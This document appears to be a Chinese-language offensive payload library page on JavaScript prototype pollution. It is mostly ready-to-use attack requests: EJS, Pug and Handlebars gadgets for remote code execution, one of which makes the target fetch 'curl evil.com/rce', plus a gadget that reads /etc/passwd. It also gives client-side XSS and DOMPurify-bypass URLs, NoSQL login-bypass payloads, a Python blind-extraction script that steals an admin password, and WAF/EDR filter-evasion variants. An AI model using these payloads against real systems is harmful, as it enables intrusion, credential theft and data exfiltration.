# RCE — 原型链污染 payload 库

> 父文档:[00-index.md](00-index.md)
> 服务端原型链污染到 RCE / 客户端到 XSS / 与 NoSQL 注入组合。Node.js / lodash / jQuery `$.extend` / `_.merge` / `Object.assign` 用户可控时考虑。

---

### 服务端原型链污染到RCE  `proto-server-rce`
通过污染JavaScript对象原型链(__proto__/constructor.prototype)注入恶意属性，在Node.js服务端利用child_process或EJS/Pug等模板引擎的gadget链实现远程代码执行。
子类：**服务端利用** · tags: `原型链` `Prototype Pollution` `RCE` `Node.js` `__proto__`

**前置条件：** 目标使用Node.js；存在JSON合并/深拷贝操作；可控JSON输入

**攻击链：**

**1. 1. 检测原型链污染点**
_通过__proto__和constructor.prototype两种方式测试是否存在原型链污染_
```
# 发送__proto__污染测试
curl -X POST "https://{TARGET}/api/update" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"polluted": "test123"}}'

# constructor方式
curl -X POST "https://{TARGET}/api/merge" \
  -H "Content-Type: application/json" \
  -d '{"constructor": {"prototype": {"polluted": "test123"}}}'

# 验证污染是否成功(通过报错/行为变化)
curl "https://{TARGET}/api/debug" | grep "polluted"
```

**2. 2. EJS模板引擎RCE Gadget**
_利用EJS模板引擎的outputFunctionName/escapeFunction gadget实现RCE_
```
# EJS RCE gadget——污染outputFunctionName
curl -X POST "https://{TARGET}/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"outputFunctionName": "x;process.mainModule.require(\"child_process\").execSync(\"id\");x"}}'

# 触发模板渲染
curl "https://{TARGET}/dashboard"

# EJS client参数RCE
curl -X POST "https://{TARGET}/api/config" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"client": true, "escapeFunction": "1;return process.mainModule.require(\"child_process\").execSync(\"id\")"}}'
```

**3. 3. Pug模板引擎RCE Gadget**
_利用Pug和Handlebars模板引擎的已知gadget链实现代码执行_
```
# Pug/Jade RCE gadget——污染block属性
curl -X POST "https://{TARGET}/api/profile" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"block": {"type": "Text", "val": "x]));process.mainModule.require(\"child_process\").execSync(\"curl evil.com/rce\");//"}}}'

# Handlebars RCE gadget
curl -X POST "https://{TARGET}/api/template" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"allowedProtoMethods": {"__defineGetter__": true}, "allowedProtoProperties": {"__defineGetter__": true}}}'
```

**4. 4. 通用DoS/信息泄露Gadget**
_利用通用gadget造成DoS、状态码篡改、环境变量注入和任意文件读取_
```
# 污染toString造成异常
{"__proto__": {"toString": null}}

# 污染status属性改变响应
{"__proto__": {"status": 500}}

# 污染环境变量注入
{"__proto__": {"env": {"NODE_OPTIONS": "--require /proc/self/environ"}}}

# 污染shell属性(配合child_process.exec)
{"__proto__": {"shell": "/proc/self/exe", "argv0": "console.log(require(\"fs\").readFileSync(\"/etc/passwd\",\"utf8\"))//"}}}
```

**WAF/EDR 绕过变体：**

**1. 绕过__proto__关键字过滤**
_通过Unicode编码、constructor路径、嵌套对象和JSON5语法绕过__proto__过滤_
```
# Unicode编码
{"\u005f\u005fproto\u005f\u005f": {"polluted": true}}

# constructor路径
{"constructor": {"prototype": {"polluted": true}}}

# 嵌套路径
{"a": {"__proto__": {"polluted": true}}}

# 使用JSON5语法(如果支持)
{__proto__: {polluted: true}}

# 数组原型污染
{"__proto__": [], "length": 1, "0": "exploit"}
```

---

### 客户端原型链污染到XSS  `proto-client-xss`
通过URL参数、postMessage或DOM操作污染前端JavaScript原型链，利用jQuery/DOM操作库的gadget在客户端实现XSS。攻击者可通过精心构造的URL链接诱导受害者触发漏洞。
子类：**客户端利用** · tags: `原型链` `XSS` `客户端` `jQuery` `DOM` `Prototype Pollution`

**前置条件：** 目标前端使用易受影响的JS库；存在URL参数到对象转换的逻辑

**攻击链：**

**1. 1. 识别客户端污染源**
_通过URL参数和Hash片段测试前端原型链污染_
```
# URL参数解析污染(常见于自定义query parser)
https://{TARGET}/page?__proto__[polluted]=test
https://{TARGET}/page?__proto__.polluted=test
https://{TARGET}/page?constructor[prototype][polluted]=test

# Hash片段污染
https://{TARGET}/page#__proto__[polluted]=test

# 验证：在控制台检查
console.log(({}).polluted); // 如果输出"test"则确认污染
```

**2. 2. jQuery html() Gadget**
_利用jQuery的html()方法和$.extend()深拷贝实现XSS和属性注入_
```
# 污染jQuery的innerHTML gadget
# Step 1: 污染原型
https://{TARGET}/page?__proto__[innerHTML]=<img/src=x onerror=alert(document.domain)>

# Step 2: 等待jQuery调用 $(element).html() 或 $.html()
# 当jQuery创建新元素时会读取innerHTML属性

# jQuery $.extend() 深拷贝污染
$.extend(true, {}, JSON.parse('{"__proto__":{"isAdmin":true}}'));
// 之后所有 obj.isAdmin 都返回 true
```

**3. 3. DOMPurify绕过Gadget**
_通过污染DOMPurify配置、Lodash template和传输URL实现XSS_
```
# 污染DOMPurify配置实现XSS
# 绕过ALLOWED_TAGS
https://{TARGET}/page?__proto__[ALLOWED_ATTR][]=onerror&__proto__[ALLOWED_ATTR][]=src

# 污染sanitize行为
https://{TARGET}/page?__proto__[ALLOW_ARIA_ATTR]=1&__proto__[IS_ALLOWED_URI][]=javascript

# Lodash template gadget
# 如果使用 _.template 且选项被污染
https://{TARGET}/page?__proto__[sourceURL]=%22%0aalert(1)//

# 构造完整POC链接
https://{TARGET}/page?__proto__[transport_url]=javascript:alert(1)
```

**4. 4. 自动化检测脚本**
_使用Puppeteer自动化检测前端页面的原型链污染漏洞_
```
# PPScan——自动化客户端原型链污染检测
# 使用Puppeteer自动化测试
const puppeteer = require('puppeteer');
const browser = await puppeteer.launch();
const page = await browser.newPage();

// 注入检测脚本
await page.evaluateOnNewDocument(() => {
  const marker = Math.random().toString(36);
  Object.defineProperty(Object.prototype, '__pp_test__', {
    set: function(v) { window.__ppDetected = true; }
  });
});

await page.goto('https://{TARGET}/page?__proto__[__pp_test__]=1');
const detected = await page.evaluate(() => window.__ppDetected);
console.log('Prototype Pollution:', detected ? 'VULNERABLE' : 'NOT DETECTED');
```

**WAF/EDR 绕过变体：**

**1. 绕过URL参数过滤**
_通过URL编码、constructor路径和嵌套结构绕过前端原型链污染过滤_
```
# URL编码__proto__
?__%70roto__[xss]=test
?%5f%5fproto%5f%5f[xss]=test

# 使用constructor路径
?constructor[prototype][xss]=test
?constructor.prototype.xss=test

# 数组索引污染
?__proto__[0]=payload

# 多层嵌套
?a[__proto__][xss]=test
?a.b.__proto__.xss=test
```

---

### 原型链污染结合NoSQL注入  `proto-nosql-injection`
将原型链污染与MongoDB/NoSQL注入组合利用。通过污染查询对象的原型链属性，绕过认证逻辑或构造恶意查询条件，实现认证绕过和数据泄露。
子类：**组合利用** · tags: `原型链` `NoSQL` `MongoDB` `认证绕过` `组合攻击`

**前置条件：** 目标使用MongoDB；存在原型链污染点；存在查询构造逻辑

**攻击链：**

**1. 1. 识别MongoDB查询注入点**
_使用MongoDB操作符($ne/$regex/$gt)测试NoSQL注入实现认证绕过_
```
# 测试NoSQL操作符注入
curl -X POST "https://{TARGET}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": {"$ne": ""}, "password": {"$ne": ""}}'

# $regex匹配
curl -X POST "https://{TARGET}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$regex": ".*"}}'

# $gt永真条件
curl -X POST "https://{TARGET}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": {"$gt": ""}}'
```

**2. 2. 原型链污染绕过查询校验**
_利用原型链污染注入MongoDB的$where条件绕过操作符过滤_
```
# 场景：后端有操作符过滤
# if (hasOperator(input)) reject();

# 通过原型链污染注入$where
curl -X PATCH "https://{TARGET}/api/settings" \
  -H "Content-Type: application/json" \
  -d '{"__proto__": {"$where": "function(){return true}"}}'

# 后续查询将继承$where条件
curl -X POST "https://{TARGET}/api/login" \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "anything"}'
# 如果login查询使用了被污染的对象，$where永真条件导致认证绕过
```

**3. 3. 布尔盲注提取数据**
_使用$regex盲注逐字符提取MongoDB中存储的密码_
```
# 利用$regex逐字符提取管理员密码
import requests
import string

url = "https://{TARGET}/api/login"
password = ""
chars = string.ascii_letters + string.digits + string.punctuation

for i in range(32):
    for c in chars:
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{password}{re.escape(c)}"}
        }
        r = requests.post(url, json=payload)
        if r.status_code == 200 and "token" in r.text:
            password += c
            print(f"Found: {password}")
            break

print(f"Admin password: {password}")
```

**4. 4. 数据库枚举与导出**
_利用认证绕过后的管理员权限枚举和导出敏感数据_
```
# 利用$func执行服务端JS(旧版MongoDB)
curl -X POST "https://{TARGET}/api/search" \
  -H "Content-Type: application/json" \
  -d '{"$where": "function(){return this.role==\"admin\"}"}'

# 利用已获取的认证绕过导出数据
curl -s "https://{TARGET}/api/users?limit=1000" \
  -H "Authorization: Bearer {ADMIN_TOKEN}" | jq '.[].email'

# 检查MongoDB REST接口(如果暴露)
curl -s "https://{TARGET}:28017/" 2>/dev/null
curl -s "https://{TARGET}/api/db/_stats" 2>/dev/null
```

**WAF/EDR 绕过变体：**

**1. 绕过NoSQL操作符过滤**
_通过Unicode编码、Content-Type切换和表单格式绕过NoSQL注入过滤_
```
# Unicode编码操作符
{"username": "admin", "password": {"\u0024ne": ""}}

# 嵌套绕过
{"username": "admin", "password": {"$eq": {"$ne": ""}}}

# 利用Content-Type差异
# application/x-www-form-urlencoded
username=admin&password[$ne]=&password[$regex]=.*

# 数组注入
username=admin&password[0][$gt]=
```

---

---

← 回 [00-index.md](00-index.md)
